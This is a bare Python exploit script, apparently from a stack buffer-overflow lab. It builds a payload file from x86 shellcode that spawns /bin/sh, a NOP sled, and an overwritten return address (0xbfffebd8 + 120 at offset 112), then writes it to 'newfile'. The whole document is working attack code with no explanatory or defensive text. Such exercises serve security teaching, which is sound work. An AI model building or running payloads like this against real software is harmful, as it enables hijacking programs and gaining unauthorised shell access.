#!/usr/bin/python3
import sys

shellcode= (
    "\x31\xc0"             
    "\x50"                 
    "\x68""//sh"           
    "\x68""/bin"           
    "\x89\xe3"             
    "\x50"                 
    "\x53"                 
    "\x89\xe1"             
    "\x99"                 
    "\xb0\x0b"             
    "\xcd\x80"             
).encode('latin-1')


arr = bytearray(0x90 for i in range(300))      


start = 300 - len(shellcode)
arr[start:] = shellcode                       


ret = 0xbfffebd8 + 120                                   
arr[112:116]  = (ret).to_bytes(4,byteorder='little')  


with open('newfile', 'wb') as f:
	f.write(arr)